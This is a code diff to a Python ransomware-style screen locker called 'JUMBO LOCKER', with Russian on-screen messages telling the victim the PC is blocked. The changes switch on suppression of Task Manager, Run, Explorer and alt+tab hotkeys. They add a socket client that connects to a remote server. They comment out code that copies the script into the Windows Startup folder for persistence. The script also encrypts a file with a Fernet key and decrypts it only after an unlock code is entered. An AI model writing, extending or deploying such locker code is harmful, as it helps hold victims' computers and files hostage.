@@ -12,18 +12,30 @@ import pygame
 import keyboard
 from tkinter import *
 from PIL import Image, ImageTk
+import socket
+
+import socket
+from requests import get
+
+def start_client():
+    server_ip = get('https://api64.ipify.org?format=json').json()['ip']
+    server_port = 12345  # Порт сервера
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.connect((server_ip, server_port))
+    print("Connected to server")
 
 
-#keyboard.add_hotkey("alt + tab", lambda: None, suppress =True)
-#keyboard.add_hotkey("win + r", lambda: None, suppress =True)
-#keyboard.add_hotkey("ctrl + shift + esc", lambda: None, suppress =True)
+keyboard.add_hotkey("alt + tab", lambda: None, suppress =True)
+keyboard.add_hotkey("win + r", lambda: None, suppress =True)
+keyboard.add_hotkey("win + e", lambda: None, suppress =True)
+keyboard.add_hotkey("ctrl + shift + esc", lambda: None, suppress =True)
 
-startup_filename = "JUMBO LOCKER"
-startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-current_script = sys.argv[0]
-startup_script = os.path.join(startup_folder, startup_filename + ".py")
-if not os.path.exists(startup_script):
-    shutil.copy2(current_script, startup_script)
+#startup_filename = "JUMBO LOCKER"
+#startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+#current_script = sys.argv[0]
+#startup_script = os.path.join(startup_folder, startup_filename + ".exe")
+#if not os.path.exists(startup_script):
+#   shutil.copy2(current_script, startup_script)
 
 image_path = "background.png"
 def set_background(window, image_path):
@@ -53,7 +65,8 @@ def check():
         win.attributes("-fullscreen", False)
         win.update()
         win.geometry("300x300")
-        decrypt_file(file_to_encrypt, fernet_key) 
+        decrypt_file(file_to_encrypt, fernet_key)
+        sys.exit() 
     else:
         messagebox.showinfo("Уведомление", "ДА ПИЗДА УЖЕ КОМПУ МОЖЕШЬ НЕ ПЫТАТЬСЯ")
 
@@ -89,6 +102,7 @@ unlock_key = '123123'
 is_code_entered = False
 
 win = tk.Tk()
+win.title('JUMBO LOCKER')
 set_background(win, image_path)
 win.resizable(False, False)
 logo = tk.PhotoImage(file='logo.png')
@@ -103,7 +117,7 @@ label = tk.Label(win, text='ТВОЙ ПК ЗАБЛОКИРОВАН BY JUMBO LOCK
 label.grid(row=2, padx=350, pady=20)
 label.config(font=("Helvetica", 17))
 
-entry = tk.Entry(win)
+entry = tk.Entry(win, show='*')
 entry.grid(row=4, padx=350, pady=20)
 
 button = tk.Button(win, text="Ввести код", command=check)
@@ -114,6 +128,7 @@ time_label = tk.Label(win, text="", fg='red', bg='black')
 time_label.grid(row=0, padx=350, pady=20)
 
 fernet_key = Fernet.generate_key()
+
 
 pygame.init()
 pygame.mixer.init()
